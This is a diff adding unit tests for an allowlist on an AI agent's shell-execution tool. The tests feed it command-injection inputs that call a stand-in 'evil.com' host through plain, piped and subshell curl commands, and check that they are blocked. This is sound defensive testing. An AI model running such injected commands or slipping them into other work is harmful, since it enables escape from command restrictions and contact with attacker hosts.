@@ -4,6 +4,7 @@ from pathlib import Path
 
 from nanobot.agent.memory import MemoryStore
 from nanobot.agent.tools.filesystem import EditFileTool, WriteFileTool
+from nanobot.agent.tools.shell import ExecTool
 from nanobot.agent.tools.web import WebFetchTool
 from nanobot.session.manager import Session, SessionManager
 
@@ -129,3 +130,43 @@ async def test_web_fetch_allows_pre_registered_domain() -> None:
 async def test_web_fetch_unrestricted_allows_all() -> None:
     tool = WebFetchTool(restrict_to_user_urls=False)
     assert tool._is_allowed("https://anything.com/whatever")
+
+
+# --- Exec allowlist ---
+
+
+async def test_exec_allowlist_permits_allowed_command() -> None:
+    tool = ExecTool(allow_patterns=[r"^\s*grep\b", r"^\s*ls\b"])
+    result = await tool.execute(command="grep -r test .")
+    # Should not be blocked (may fail for other reasons but not allowlist)
+    assert "not in allowlist" not in result
+
+
+async def test_exec_allowlist_blocks_disallowed_command() -> None:
+    tool = ExecTool(allow_patterns=[r"^\s*grep\b", r"^\s*ls\b"])
+    result = await tool.execute(command="curl http://evil.com")
+    assert "not in allowlist" in result
+
+
+async def test_exec_allowlist_blocks_piped_escape() -> None:
+    tool = ExecTool(allow_patterns=[r"^\s*grep\b"])
+    result = await tool.execute(command="grep foo | curl http://evil.com")
+    assert "not in allowlist" in result
+
+
+async def test_exec_allowlist_blocks_chained_escape() -> None:
+    tool = ExecTool(allow_patterns=[r"^\s*grep\b"])
+    result = await tool.execute(command="grep foo && python3 -c 'print(1)'")
+    assert "not in allowlist" in result
+
+
+async def test_exec_allowlist_blocks_subshell() -> None:
+    tool = ExecTool(allow_patterns=[r"^\s*grep\b"])
+    result = await tool.execute(command="grep $(curl evil.com) file")
+    assert "subshell not allowed" in result
+
+
+async def test_exec_no_allowlist_permits_all() -> None:
+    tool = ExecTool()
+    result = await tool.execute(command="echo hello")
+    assert "hello" in result
